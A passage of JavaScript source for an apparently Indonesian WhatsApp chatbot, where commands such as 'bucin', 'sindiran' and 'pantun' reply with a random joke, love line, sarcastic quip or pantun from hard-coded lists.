            teks += `• Link Developer : ${i.link_dev}\n\n─────────────┈\n`
}
m.reply(teks)
}
break
//========================
case 'bacot':
case 'quotesbacot':
case 'bacod':
case 'qbacot':
case 'qbacod': {
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
const pew = ['Kamu suka kopi nggak? Aku sih suka. Tau kenapa alesannya? Kopi itu ibarat kamu, pahit sih tapi bikin candu jadi pingin terus.', 'Gajian itu kayak mantan ya? Bisanya cuman lewat sebentar saja.', 'Kata pak haji, cowok yang nggak mau pergi Sholat Jumat disuruh pakai rok aja.', 'Kamu tahu mantan nggak? Mantan itu ibarat gajian, biasa numpang lewat dong di kehidupan kita.', 'Aku suka kamu, kamu suka dia, tapi dia sayangnya nggak ke kamu. Wkwkw lucu ya? Cinta serumit ini.', 'Google itu hebat ya? Tapi sayang sehebat-hebatnya Google nggak bisa menemukan jodoh kita.', 'Terlalu sering memegang pensil alis dapat membuat mata menjadi buta, jika dicolok-colokkan ke mata.', 'Saya bekerja keras karena sadar kalau uang nggak punya kaki buat jalan sendiri ke kantong saya.', 'Jika kamu tak mampu meyakinkan dan memukau orang dengan kepintaranmu, bingungkan dia dengan kebodohanmu.', 'Selelah-lelahnya bekerja, lebih lelah lagi kalau nganggur.', 'Kita hidup di masa kalau salah kena marah, pas bener dibilang tumben.', 'Nggak ada bahu pacar? Tenang aja, masih ada bahu jalan buat nyandar.', 'Mencintai dirimu itu wajar, yang gak wajar mencintai bapakmu.', 'Katanya enggak bisa bohong. Iyalah, mata kan cuma bisa melihat.', 'Madu di tangan kananmu, racun di tangan kirimu, jodoh tetap di tangan tuhan.', 'Selingkuh terjadi bukan karena ada niat, selingkuh terjadi karna pacar kamu masih laku.', 'Netizen kalau senam jempol di ponsel nggak pakai pendinginan, pantes komennya bikin panas terus.', 'Jodoh memang enggak kemana, tapi saingannya ada dimana-mana.',
'Perasaan aku salah terus di matamu. Kalu gitu, besok aku pindah ke hidungmu.', 'Jomblo tidak perlu malu, jomblo bukan berarti tidak laku, tapi memang tidak ada yang mau.', 'Jika doamu belum terkabul maka bersabar, ingatlah bahwa yang berdoa bukan cuma kamu!', 'Masih berharap dan terus berharap lama-lama aku jadi juara harapan.', 'Manusia boleh berencana, tapi akhirnya saldo juga yang menentukan.', 'Statusnya rohani, kelakuannya rohalus.', 'Kegagalan bukan suatu keberhasilan.', 'Tadi mau makan bakso, cuma kok panas banget, keliatannya baksonya lagi demam.', 'Aku juga pernah kaya, waktu gajian.', 'Aku diputusin sama pacar karena kita beda keyakinan. Aku yakin kalau aku ganteng, tapi dia enggak.', 'Masa depanmu tergantung pada mimpimu, maka perbanyaklah tidur.', 'Seberat apapun pekerjaanmu, akan semakin ringan jika tidak dibawa.', 'Jangan terlalu berharap! nanti jatuhnya sakit!', 'Ingat! Anda itu jomblo', 'Gak tau mau ngetik apa']
const gyat = pew[Math.floor(Math.random() * pew.length)]
Al.sendMessage(m.chat, {text: `${gyat}` }, {quoted: m})
}
break
//========================
case 'bucin':
case 'quotesbucin':
case 'qbucin': {
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
const lolo = ["Aku memilih untuk sendiri, bukan karena menunggu yang sempurna, tetapi butuh yang tak pernah menyerah.",
	"Seorang yang single diciptakan bersama pasangan yang belum ditemukannya.",
	"Jomblo. Mungkin itu cara Tuhan untuk mengatakan 'Istirahatlah dari cinta yang salah'.",
	"Jomblo adalah anak muda yang mendahulukan pengembangan pribadinya untuk cinta yang lebih berkelas nantinya.",
	"Aku bukan mencari seseorang yang sempurna, tapi aku mencari orang yang menjadi sempurna berkat kelebihanku.",
	"Pacar orang adalah jodoh kita yang tertunda.",
	"Jomblo pasti berlalu. Semua ada saatnya, saat semua kesendirian menjadi sebuah kebersamaan dengannya kekasih halal. Bersabarlah.",
	"Romeo rela mati untuk juliet, Jack mati karena menyelamatkan Rose. Intinya, kalau tetap mau hidup, jadilah single.",
	"Aku mencari orang bukan dari kelebihannya tapi aku mencari orang dari ketulusan hatinya.",
	"Jodoh bukan sendal jepit, yang kerap tertukar. Jadi teruslah berada dalam perjuangan yang semestinya.",
	"Kalau kamu jadi senar gitar, aku nggak mau jadi gitarisnya. Karena aku nggak mau mutusin kamu.",
	"Bila mencintaimu adalah ilusi, maka izinkan aku berimajinasi selamanya.",
	"Sayang... Tugas aku hanya mencintaimu, bukan melawan takdir.",
	"Saat aku sedang bersamamu rasanya 1 jam hanya 1 detik, tetapi jika aku jauh darimu rasanya 1 hari menjadi 1 tahun.",
	"Kolak pisang tahu sumedang, walau jarak membentang cintaku takkan pernah hilang.",
	"Aku ingin menjadi satu-satunya, bukan salah satunya.",
	"Aku tidak bisa berjanji untuk menjadi yang baik. Tapi aku berjanji akan selalu mendampingi kamu.",
	"Kalau aku jadi wakil rakyat aku pasti gagal, gimana mau mikirin rakyat kalau yang selalu ada dipikiran aku hanyalah dirimu.",
	"Lihat kebunku, penuh dengan bunga. Lihat matamu, hatiku berbunga-bunga.",
	"Berjanjilah untuk terus bersamaku sekarang, esok, dan selamanya.",
	"Rindu tidak hanya muncul karena jarak yang terpisah. Tapi juga karena keinginan yang tidak terwujud.",
	"Kamu tidak akan pernah jauh dariku, kemanapun aku pergi kamu selalu ada, karena kamu selalu di hatiku, yang jauh hanya raga kita bukan hati kita.",
	"Aku tahu dalam setiap tatapanku, kita terhalang oleh jarak dan waktu. Tapi aku yakin kalau nanti kita pasti bisa bersatu.",
	"Merindukanmu tanpa pernah bertemu sama halnya dengan menciptakan lagu yang tak pernah ternyayikan.",
	"Ada kalanya jarak selalu menjadi penghalang antara aku sama kamu, namun tetap saja di hatiku kita selalu dekat.",
	"Jika hati ini tak mampu membendung segala kerinduan, apa daya tak ada yang bisa aku lakukan selain mendoakanmu.",
	"Mungkin di saat ini aku hanya bisa menahan kerinduan ini. Sampai tiba saatnya nanti aku bisa bertemu dan melepaskan kerinduan ini bersamamu.",
	"Melalui rasa rindu yang bergejolak dalam hati, di situ terkadang aku sangat membutuhkan dekap peluk kasih sayangmu.",
	"Dalam dinginnya malam, tak kuingat lagi; Berapa sering aku memikirkanmu juga merindukanmu.",
	"Merindukanmu itu seperti hujan yang datang tiba-tiba dan bertahan lama. Dan bahkan setelah hujan reda, rinduku masih terasa.",
	"Sejak mengenalmu bawaannya aku pengen belajar terus, belajar menjadi yang terbaik buat kamu.",
	"Tahu gak perbedaan pensi sama wajah kamu? Kalau pensil tulisannya bisa dihapus, tapi kalau wajah kamu gak akan ada yang bisa hapus dari pikiran aku.",
	"Bukan Ujian Nasional besok yang harus aku khawatirkan, tapi ujian hidup yang aku lalui setelah kamu meninggalkanku.",
	"Satu hal kebahagiaan di sekolah yang terus membuatku semangat adalah bisa melihat senyumanmu setiap hari.",
	"Kamu tahu gak perbedaanya kalau ke sekolah sama ke rumah kamu? Kalo ke sekolah pasti yang di bawa itu buku dan pulpen, tapi kalo ke rumah kamu, aku cukup membawa hati dan cinta.",
	"Aku gak sedih kok kalo besok hari senin, aku sedihnya kalau gak ketemu kamu.",
	"Momen cintaku tegak lurus dengan momen cintamu. Menjadikan cinta kita sebagai titik ekuilibrium yang sempurna.",
	"Aku rela ikut lomba lari keliling dunia, asalkan engkai yang menjadi garis finishnya.",
	"PR-ku adalah merindukanmu. Lebih kuat dari Matematika, lebih luas dari Fisika, lebih kerasa dari Biologi.",
	"Cintaku kepadamu itu bagaikan metabolisme, yang gak akan berhenti sampai mati.",
	"Kalau jelangkungnya kaya kamu, dateng aku jemput, pulang aku anter deh.",
	"Makan apapun aku suka asal sama kamu, termasuk makan ati.",
	"Cinta itu kaya hukuman mati. Kalau nggak ditembak, ya digantung.",
	"Mencintaimu itu kayak narkoba: sekali coba jadi candu, gak dicoba bikin penasaran, ditinggalin bikin sakaw.",
	"Gue paling suka ngemil karena ngemil itu enak. Apalagi ngemilikin kamu sepenuhnya...",
	"Dunia ini cuma milik kita berdua. Yang lainnya cuma ngontrak.",
	"Bagi aku, semua hari itu adalah hari Selasa. Selasa di Surga bila dekat denganmu...",
	"Bagaimana kalau kita berdua jadi komplotan penjahat? Aku curi hatimu dan kamu curi hatiku.",
	"Kamu itu seperti kopi yang aku seruput pagi ini. Pahit, tapi bikin nagih.",
	"Aku sering cemburu sama lipstikmu. Dia bisa nyium kamu tiap hari, dari pagi sampai malam.",
	"Hanya mendengar namamu saja sudah bisa membuatku tersenyum seperti orang bodoh.",
	"Aku tau teman wanitamu bukan hanya satu, dan menyukaimu pun bukan hanya aku.",
	"Semenjak aku berhenti berharap pada dirimu, aku jadi tidak semangat dalam segala hal..",
	"Denganmu, jatuh cinta adalah patah hati paling sengaja.",
	"Sangat sulit merasakan kebahagiaan hidup tanpa kehadiran kamu disisiku.",
	"Melalui rasa rindu yang bergejolak dalam hati, di situ terkadang aku sangat membutuhkan dekap peluk kasih sayangmu.",
	"Sendainya kamu tahu, sampai saat ini aku masih mencintaimu.",
	"Terkadang aku iri sama layangan..talinya putus saja masih dikejar kejar dan gak rela direbut orang lain...",
	"Aku tidak tahu apa itu cinta, sampai akhirnya aku bertemu denganmu. Tapi, saat itu juga aku tahu rasanya patah hati.",
	"Mengejar itu capek, tapi lebih capek lagi menunggu\nMenunggu kamu menyadari keberadaanku...",
	"Jangan berhenti mencinta hanya karena pernah terluka. Karena tak ada pelangi tanpa hujan, tak ada cinta sejati tanpa tangisan.",
	"Aku punya sejuta alasan unutk melupakanmu, tapi tak ada yang bisa memaksaku untuk berhenti mencintaimu.",
	"Terkadang seseorang terasa sangat bodoh hanya untuk mencintai seseorang.",
	"Kamu adalah patah hati terbaik yang gak pernah aku sesali.",
	"Bukannya tak pantas ditunggu, hanya saja sering memberi harapan palsu.",
	"Sebagian diriku merasa sakit, Mengingat dirinya yang sangat dekat, tapi tak tersentuh.",
	"Hal yang terbaik dalam mencintai seseorang adalah dengan diam-diam mendo akannya.",
	"Kuharap aku bisa menghilangkan perasaan ini secepat aku kehilanganmu.",
	"Demi cinta kita menipu diri sendiri. Berusaha kuat nyatanya jatuh secara tak terhormat.",
	"Anggaplah aku rumahmu, jika kamu pergi kamu mengerti kemana arah pulang. Menetaplah bila kamu mau dan pergilah jika kamu bosan...",
	"Aku bingung, apakah aku harus kecewa atu tidak? Jika aku kecewa, emang siapa diriku baginya?\n\nKalau aku tidak kecewa, tapi aku menunggu ucapannya.",
	"Rinduku seperti ranting yang tetap berdiri.Meski tak satupun lagi dedaunan yang menemani, sampai akhirnya mengering, patah, dan mati.",
	"Kurasa kita sekarang hanya dua orang asing yang memiliki kenangan yang sama.",
	"Buatlah aku bisa membencimu walau hanya beberapa menit, agar tidak terlalu berat untuk melupakanmu.",
	"Aku mencintaimu dengan segenap hatiku, tapi kau malah membagi perasaanmu dengan orang lain.",
	"Mencintaimu mungkin menghancurkanku, tapi entah bagaimana meninggalkanmu tidak memperbaikiku.",
	"Kamu adalah yang utama dan pertama dalam hidupku. Tapi, aku adalah yang kedua bagimu.",
	"Jika kita hanya bisa dipertemukan dalam mimpi, aku ingin tidur selamanya.",
	"Melihatmu bahagia adalah kebahagiaanku, walaupun bahagiamu tanpa bersamaku.",
	"Aku terkadang iri dengan sebuah benda. Tidak memiliki rasa namun selalu dibutuhkan. Berbeda dengan aku yang memiliki rasa, namun ditinggalkan dan diabaikan...",
	"Bagaimana mungkin aku berpindah jika hanya padamu hatiku bersinggah?",
	"Kenangan tentangmu sudah seperti rumah bagiku. Sehingga setiap kali pikiranku melayang, pasti ujung-ujungnya akan selalu kembali kepadamu.",
	"Kenapa tisue bermanfaat? Karena cinta tak pernah kemarau. - Sujiwo Tejo",
	"Kalau mencintaimu adalah kesalahan, yasudah, biar aku salah terus saja.",
	"Sejak kenal kamu, aku jadi pengen belajar terus deh. Belajar jadi yang terbaik buat kamu.",
	"Ada yang bertingkah bodoh hanya untuk melihatmu tersenyum. Dan dia merasa bahagia akan hal itu.",
	"Aku bukan orang baik, tapi akan belajar jadi yang terbaik untuk kamu.",
	"Kita tidak mati, tapi lukanya yang membuat kita tidak bisa berjalan seperti dulu lagi.",
	"keberadaanmu bagaikan secangkir kopi yang aku butuhkan setiap pagi, yang dapat mendorongku untuk tetap bersemangat menjalani hari.",
	"Aku mau banget ngasih dunia ke kamu. Tapi karena itu nggak mungkin, maka aku akan kasih hal yang paling penting dalam hidupku, yaitu duniaku.",
	"Mending sing humoris tapi manis, ketimbang sok romantis tapi akhire tragis.",
	"Ben akhire ora kecewa, dewe kudu ngerti kapan waktune berharap lan kapan kudu mandeg.",
	"Aku ki wong Jowo seng ora ngerti artine 'I Love U'. Tapi aku ngertine mek 'Aku tresno awakmu'.",
	"Ora perlu ayu lan sugihmu, aku cukup mok setiani wes seneng ra karuan.",
	"Cintaku nang awakmu iku koyok kamera, fokus nang awakmu tok liyane mah ngeblur.",
	"Saben dino kegowo ngimpi tapi ora biso nduweni.",
	"Ora ketemu koe 30 dino rasane koyo sewulan.",
	"Aku tanpamu bagaikan sego kucing ilang karete. Ambyar.",
	"Pengenku, Aku iso muter wektu. Supoyo aku iso nemokne kowe lewih gasik. Ben Lewih dowo wektuku kanggo urip bareng sliramu.",
	"Aku ora pernah ngerti opo kui tresno, kajaba sak bare ketemu karo sliramu.",
	"Cinta aa ka neng moal leungit-leungit sanajan aa geus kawin deui.",
	"Kasabaran kaula aya batasna, tapi cinta kaula ka anjeun henteu aya se epna.",
	"Kanyaah akang moal luntur najan make Bayclean.",
	"Kenangan endah keur babarengan jeung anjeun ek tuluy diinget-inget nepi ka poho.",
	"Kuring moal bakal tiasa hirup sorangan, butuh bantosan jalmi sejen.",
	"Nyaahna aa ka neg teh jiga tukang bank keur nagih hutang (hayoh mumuntil).",
	"Kasabaran urang aya batasna, tapi cinta urang ka maneh moal aya beakna.",
	"Hayang rasana kuring ngarangkai kabeh kata cinta anu aya di dunya ieu, terus bade ku kuring kumpulkeun, supaya anjeun nyaho gede pisan rasa cinta kuring ka anjeun.",
	"Tenang wae neng, ari cinta Akang mah sapertos tembang krispatih; Tak lekang oleh waktu.",
	"Abdi sanes jalmi nu sampurna pikeun anjeun, sareng sanes oge nu paling alus kanggo anjeun. Tapi nu pasti, abdi jalmi hiji-hijina nu terus emut ka anjeun.",
	"Cukup jaringan aja yang hilang, kamu jangan.",
	"Sering sih dibikin makan ati. Tapi menyadari kamu masih di sini bikin bahagia lagi.",
	"Musuhku adalah mereka yang ingin memilikimu juga.",
	"Banyak yang selalu ada, tapi kalo cuma kamu yang aku mau, gimana?",
	"Jam tidurku hancur dirusak rindu.",
	"Cukup China aja yang jauh, cinta kita jangan.",
	"Yang penting itu kebahagiaan kamu, aku sih gak penting..",
	"Cuma satu keinginanku, dicintai olehmu..",
	"Aku tanpamu bagaikan ambulans tanpa wiuw wiuw wiuw.",
	"Cukup antartika aja yang jauh. Antarkita jangan."]
const gyot = lolo[Math.floor(Math.random() * lolo.length)]
Al.sendMessage(m.chat, {text: `${gyot}` }, {quoted: fkontak})
}
break
//========================
case 'sindiran':
case 'qsindiran':
case 'quotessindiran': {
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
const lili = ["Perbedaan teman dan musuh sangat tipis. Ada saatnya dia mendukung berbagai hal yang kamu lakukan, tapi bisa saja dia menusuk dari belakang, bahkan menghancurkanmu.",
  "Dasar gak tahu berterima kasih! Makanya hidupnya bisa menderita seperti itu.",
  "Awas aja, apa yang dia lakukan sekarang bakal berbuah karma di kemudian hari.",
  "Kalau sudah berbicara tentang perasaan, sahabat pun berisiko jadi pelaku tikung menikung.",
  "Bahkan kayu yang berada di sungai selama puluhan tahun pun tak akan berubah menjadi buaya.",
  "Kata 'teman' adalah label yang bisa dicoba siapa saja. Dan kaulah yang menentukan siapa yang paling pantas memakainya.",
  "Sekali-kali bolehlah menjadi orang yang jahat karena menjadi orang baik terus malah dimanfaatin sama teman sendiri.",
  "Terus aja ngomong, aku nguap kalau aku tertarik.",
  "Ada tujuh miliar orang di dunia ini. Kenapa kamu biarkan salah satu dari mereka menghancurkan hidupmu?.",
  "Oh, menderita? Makanya, jangan bikin susah orang.",
  "Hati-hati dengan mereka yang tak pernah sesuai antara ucapan dan tindakan.",
  "Silahkan ngomongin gue sepuasnya, gue hanya senyum saja karena gue tahu karena akan ada yang membalas.",
  "Tak seorang pun mempercayai pembohong. Sekalipun dia menceritakan kebenaran.",
  "Teman datang dan pergi, tapi aku tidak menyangka kamu juga.",
  "Oh, salahku. Maaf sudah mengganggumu. Aku lupa aku hanya ada ketika kamu membutuhkan sesuatu dariku.",
  "Bodoh kok dipiara, kambing tuh dipiara biar gemuk.",
  "Kamu terdengar lebih merdu ketika mulutmu tertutup.",
  "Daripada kamu mau makan teman, jangan lupa tambahkan nasi biar makin kenyang.",
  "Kamu tuh lucu banget, udah tau salah kok malah ngotot.",
  "Omonganmu seperti parfum isi ulang, wangi tapi palsu.",
  "Pasti kamu capek karena harus pakai make up di dua wajah sekaligus.",
  "Konon jika jodoh adalah tulang rusuk, maka mantan sudah menjadi fosil alias tulang belulang.",
  "Bekerjalah seperti tuyul, ia tidak kelihatan, tidak butuh pujian, tidak gila jabatan, dan tidak pula cari perhatian, tapi hasilnya JELAS.",
  "Kamu kok seperti tahi cicak, neng, mukanya putih tapi lehernya hitam.",
  "Kata orang cinta itu buta, tapi nyatanya cinta bisa melihat mana yang tampan dan mana yang buruk rupa.",
  "Berjuangnya sama aku, giliran sudah berhasil kamu berpaling.",
  "Aku tidak kehilanganmu, kamu yang kehilanganku. Kau akan mencari sosokku pada setiap pacar yang kau kencani, tapi kau tidak akan menemukanku.",
  "Kamu mengingatkanku pada receh gopean. Bermuka dua dan nggak terlalu berharga.",
  "Kalau berbohong dan berselingkuh adalah sebuah pekerjaan, kamu pasti sudah menjadi jutawan.",
  "Buanglah mantan pada orang yang lebih membutuhkan.",
  "Perasaan terbaik adalah melihatmu sekarang bersama dengan seseorang yang wajahnya seperti baru saja ditendang pakai kaleng biskuit.",
  "Maaf aku alergi dengan yang namanya balikan sama mantan.",
  "Aku tidak akan pernah sedih kehilangan dirimu, justru bahagia karena tahu siapa kamu sebenarnya.",
  "Apa benar mantan itu singkatan dari manis, tapi setan?",
  "Baru putus aja udah punya pacar baru lagi, kok kamu tuh kaya rumah petak yang murah, sih.",
  "Jika ada seorang teman mengatakan kamu 'PINTAR', jangan sombong. Belum tentu teman tersebut mengatakan yang sebenarnya.",
  "Contohlah tukang parkir, walaupun punya banyak mobil tapi dia nggak sombong! Karena dia tahu semua itu hanya titipan.",
  "Lihatlah ke atas sebagai motivasi bukan untuk jadi sombong, dan melihat ke bawah agar lebih bersyukur bukan untuk menjadi rendah diri.",
  "Kepala lo lebih besar dari mulut lo, tapi kenapa omong kosong lo lebih besar dari cara berpikir lo?",
  "Orang sombong biasanya suka mengatakan hal berlebihan yang sebenarnya tidak ada padanya.",
  "Bergayalah sesuai dompetmu, wahai anak muda.",
  "Sama-sama berasal dari tanah, sama-sama nginjek tanah dan bakal balik lagi ke tanah. Jadi buat apa sombong?",
  "Orang sombong sebenarnya pengecut karena ia tak berani bergaul dengan orang yang lebih hebat dengan dirinya.",
  "Yang lagi cantik jangan sombong, itu cantik sebentar doang. Tua dikit itu cantik sudah hilang, jadi jangan sombong ya cantik.",
  "Orang sombong itu ibarat orang yang berdiri di atas gunung. Dia melihat orang lain kecil, tapi dia tidak sadar orang lain melihatnya kecil juga.",
  "Katanya move on, tapi ternyata masih sibuk stalking mantan.",
  "Jangan berkata dia hanya temanmu. Bukankah kita dulu juga berawal dari sebuah pertemanan?",
  "Hanya karena aku bersamamu sepanjang waktu, bukan berarti kamu bisa menyia-nyiakan aku.",
  "Sudah punya pacar masih juga cari perhatian orang lain, gak bahagia ya lu?",
  "Jadi siapa yang ada dalam handphonemu? Kalau sedang bersamaku kau selalu sibuk dengan handphonemu, tapi kalau aku jauh darimu pesanku lama kau balas.",
  "Hubungan akan karam jika terlalu banyak penumpang di dalamnya.",
  "Kamu sih cuma mau dimengerti dan dipahami tanpa belajar untuk mengerti dan memahami.",
  "Cie,- yang chatnya kalah penting sama game Mobile Legend.",
  "Ternyata lebih gampang update status daripada kasih kabar.",
  "Di zaman now screenshot lebih dipercaya daripada omongan.",
  "Kebohongan yang diceritakan terlalu sering lama-lama akan terasa seperti kebenaran.",
  "Tak perlu mengkhawatirkan mereka yang membicarakanmu di belakang. Mereka ada di belakangmu karena suatu alasan.",
  "Teman datang seiring banyaknya kebutuhan.",
  "Maaf kalau aku menyakiti perasaanmu saat aku bilang kamu bodoh. Aku kira kamu sudah tahu.",
  "Seorang genius sejati takut terlihat tidak sempurna dan biasanya lebih suka diam daripada mengatakan sesuatu yang tidak berarti.",
  "Sayang, kalau kamu mau bermuka dua, paling tidak buatlah salah satunya terlihat cantik.",
  "Semoga suatu hari nanti hidupmu bakal seindah apa yang kamu pamerkan di Facebook.",
  "Miliki lebih dari yang kau tunjukkan, bicaralah lebih sedikit dari yang kamu tahu.",
  "Aku tak butuh teman yang berubah saat aku berubah dan mengangguk saat aku mengangguk. Bayanganku bisa melakukannya dengan lebih baik.",
  "Dunia itu tidak sempit. Kamu saja yang mainnya kurang jauh.",
  "Menjadi suami yang baik sama seperti menjadi komika. Kamu perlu pengalaman selama 10 tahun sebelum dapat menyebut dirimu seorang pemula.",
  "Perempuan itu lebih suka perhatian kecil tapi berkali-kali, daripada perhatian besar tapi cuma sesekali.",
  "Jadilah suami yang baik, yang nggak hobi merayu wanita lain di dunia maya, yang memang banyak yang lebih cantik.",
  "Lebih baik di awal cuek, tapi akhirnya perhatian daripada awalnya perhatian tapi akhirnya cuek.",
  "Betapa indahnya kalau kita saling menghargai dan mengerti. Jangan saling egois dan nggak peduli.",
  "Yang egois kamu, yang selalu disalahkan aku. Yang temperamental kamu, yang selalu sabar aku.",
  "Di balik kesibukanmu, ada yang rela meluangkan waktunya untuk sekadar menunggumu.",
  "Aku tidak mengerti dengan cara berpikirmu. Diamnya istri itu bukan berarti membiarkanmu berbuat sesuka hati dan menyakitiku.",
  "Kalau sayang pasti nggak cuek. Kalau cuek pasti nggak sayang.",
  "Hidup harus bersosialisasi jangan egois. Kalau mau egois mending hidup di hutan.",
  "Mulut dijaga jangan kalah sama pantat deh. Pantat aja kalau mau kentut mikir dulu, ada yang dengerin apa nggak. Masa mulut mau ngomong nggak mikir dulu.",
  "Katanya sih kalau ada orang yang hobinya nyari-nyari kesalahan orang lain, tapi giliran dikritik langsung marah, itu artinya proses evolusi dia dari monyet ke manusia belum selesai dan tidak sempurna.",
  "Aku kangen denganmu, kamu yang dulu, yang baru jelek.",
  "Penampilan yang cantik adalah saat kita merasa nyaman dengan diri sendiri. Saat kita tidak iri dengan orang lain kita akan lebih cantik.",
  "Tidak selalu harus bersama, tapi selalu paham kapan seharusnya ada. Itulah sahabat sebenarnya.",
  "Saya menyukai teman yang memiliki pikiran terbuka karena mereka cenderung membiarkanmu untuk melihat segala masalah dari berbagai sudut pandang.",
  "Lebih baik musuh yang jujur daripada teman palsu.",
  "Kamu harus mengenali teman-teman yang palsu karena itu yang tersulit untuk disadari.",
  "Jangan pernah percaya kepada siapa pun yang menginginkan apa yang kamu dapatkan. Teman atau bukan, iri hati merupakan emosi yang luar biasa.",
  "Kata-kata itu mudah dibuat, seperti angin. Sahabat yang setia sulit untuk ditemukan.",
  "Akan lebih mudah untuk memaafkan orang biasa daripada memaafkan luka yang diberikan dari orang tercinta.",
  "Di balik sakitnya pengkhianatan yang Ku rasa, ku ucapkan terima kasih Padamu. Karena pengkhianatanmu membuat aku tidak lagi berkawan dengan kemunafikan.",
  "Rasa sakit itu mengajariku tentang kedewasaan, berhati-hati, dan menjadi untuk lebih baik lagi.",
  "Terima kasih sudah meninggalkanmu saat aku sendirian. Aku baru sadar kalau aku bisa melakukan semuanya dengan lebih baik tanpamu.",
  "Aku pernah tertikam oleh ilusiku sendiri. Pengkhianatan oleh hatiku yang sibuk menguntai simpul pertanda cinta.",
  "Aku sudah pernah merasakan kepahitan dalam hidup dan yang paling pahit ialah berharap kepada manusia.",
  "Terkadang kamu harus ikhlas dan membiarkan karma mengambil alih.",
  "Alhamdulillah, Tuhan masih sayang kepadaku dengan memperlihatkan siapa dirimu ketika berada di belakangku. Walau hatiku sangat sakit kala itu, tapi aku bersyukur bisa tahu. Bahwa kau adalah orang yang berbahaya.",
  "Pengalaman telah mengajariku mana itu saudara, mana kawan, mana sahabat, mana pengkhianat, mana pecundang, mana yang baik, dan mana yang pura-pura baik.",
  "Perbuatan-perbuatan salah adalah biasa bagi manusia, tetapi perbuatan pura-pura itulah sebenarnya yang menimbulkan permusuhan dan pengkhianatan.",
  "Sudah lama aku ingin pergi darimu, tapi tidak memiliki alasan. Dan sekarang aku ucapkan terima kasih karena pengkhianatan dirimu menciptakan alasan untuk pergi meninggalkan kamu.",
  "Jangan pikir saat kamu dapat menyakitiku, kamu itu terlihat hebat!Ingat, saat itu kamu sudah kehilangan orang yang benar-benar mencintaimu...",
  "Aku berhenti, terima kasih. Semoga akan ada sosok yang mampu mencintaimu sebanyak aku dan menunggumu sesabar caraku. Selamat kehilangan cinta yang paling besar.",
  "Untuk yang pernah menyakitiku, terima kasih telah mengajarkanku arti bersabar dan semoga kamu tidak akan pernah merasakan sakit yang kurasakan.",
  "Tidak bisa dibayangkan tingkah laku dan caramu. Kemarin katanya sayang, eh, ternyata hari ini malah kau berkata sayang dia.",
  "Pengkhianatan itu ibarat lumut yang tumbuh di sela-sela bebatuan, menyelusup dan tumbuh, lalu secara perlahan menghancurkan.",
  "Ketika aku melihatmu, aku selalu berpikir wajah mana yang kamu lihat ketika bercermin.",
  "Salah satu hal yang menggelikan yang terjadi pada manusia, seseorang menyakitimu lalu dia bertingkah seolah-olah kamu yang menyakitinya.",
  "Pengkhianat berawal dari watak penjilat.Penjilat berawal dari watak penjahat.Penjahat berawal dari watak sekarat.Jadi, pengkhianat akan sekarat dunia akhirat.",
  "Aku sudah berniat menaruh hati kepadamu, tapi kamu malah mengecewakan aku terlebih dahulu."]
const gyut = lili[Math.floor(Math.random() * lili.length)]
Al.sendMessage(m.chat, {text: `${gyut}` }, {quoted: fkontak})
}
break
//========================
case 'qpantun':
case 'quotespantun':
case 'pantun': {
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
const cici = ['Ada anak kecil bermain batu,\nBatu dilempar masuk ke sumur,\nBelajar itu tak kenal waktu,\nJuga tidak memandang umur. ',
'Tanam kacang di pagi hari,\nTumbuh enam layu sebatang,\nKeburukan orang jangan dicari,\nBila kalian sedang puasa. ',
'Akhir bulan mendapat gaji,\nGaji untuk membeli ketupat,\nRajin-rajinlah sholat dan mengaji,\nJanganlah lupa puasa dan zakat. ',
'Waktu daftar hari terakhir,\nWaktu terasa banyak terbuang,\nKamu nggak perlu khawatir,\ncintaku hanya untukmu seorang. ',
'Ada anak kecil bermain batu,\nBatu dilempar masuk ke sumur,\nBelajar itu tak kenal waktu,\nJuga tidak memandang umur. ',
'Seribu bebek di kandang singa,\nhanya satu berwarna belang,\nBeribu cewek di Indonesia,\nhanya engkau yang aku sayang. ',
'Hari minggu pergi ke pasar,\nBeli sayur dan juga beras,\nTiap hari harus belajar,\nPasti akan menjadi cerdas. ',
'Ayam goreng setengah mateng,\nBelinya di depan tugu.\nAbang sayang, abangku ganteng,\nlneng di sini setia menunggu. ',
'Api kecil dari tungku,\nApinya kecil habis kayu.\nSudah lama kutunggu-tunggu,\nkapan kamu bilang I love you. ',
'Seribu bebek di kandang singa,\nhanya satu berwarna belang\nBeribu cewek di Indonesia,\nhanya engkau yang aku sayang. ',
'Pergi memancing saat fajar,\nPulang siang membawa ikan\nSiapa yang rajin belajar\nJadi orang sukses kemudian. ',
'Beli computer itu biasa\nSupaya belajar jadi semangat\nMari kita belajar puasa\nAgar kita jadi kuat ',
'Minum sekoteng hangat rasanya,\nminum segelas ada yang minta.\nLaki-laki ganteng siapa yang punya?\nBolehkah aku jatuh cinta.',
'Raja gagah lagi sakti Laksamana pergi berperang Supaya tidak sesal di hati Janganlah kena perdaya orang ',
'Pergi mendaki Gunung Daik Hendak menjerat kancil dan rusa Bergotong-royong amalan yang baik Elok diamalkan setiap masa',
'Pinang muda dibelah dua Manik-manik mati dirempuh Dari muda sampai ke tua Pengajaran baik jangan diubah ',
'Tegak-tegak cocokkan pancang Pasang bendera bunyikan tabuh Agak-agak mengatai orang Supaya cedera jangan tumbuh ',
'Batang ketumbar dahan-dahan Kelapa jatuh ke tepi bangsal Biarlah sabar dengan perlahan Siapa gopoh nanti menyesal ',
'Kayu bakar dibuat arang Arang dibakar memanaskan diri Jangan mudah menyalahkan orang Cermin muka lihat sendiri ',
'Lepas di jemur baju dilipat Disimpan dalam almari lama Jangan kita tinggalkan sholat Karena sholat tiang agama',
'Ke restoran membeli makan Perginya bersama sang istri Perintah Tuhan ayo kerjakan Larangan Tuhan ayo jauhi',
'Pulau Sumatra pulau Kalimantan Pulau Bali pulau Sumba Shalat lima waktu ayo tegakkan Tiang agama nan utama',
'Membeli beras ke Mang Duloh Membeli semen ke Mang Omat Iman dan takwa kepada Allah Kunci bahagia dunia akhirat',
'Beli bensin satu tangki Bensi dibeli oleh Mak Rosa Bersihkan hati dari dengki Sucikan raga dari dosa']
const gyet = cici[Math.floor(Math.random() * cici.length)]
Al.sendMessage(m.chat, {text: `${gyet}` }, {quoted: fkontak})
}
break
//========================
case 'hacker':
case 'quoteshacker':
case 'qhacker': {
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
const tol = ["Dear kamu yang tertulis di halaman defacementku, Kapan jadi pacarku?",
	"Aku rela ko jadi Processor yg kepanasan, asalkan kmu yg jadi heatsink'y yg setiap saat bisa mendinginkan ku.",
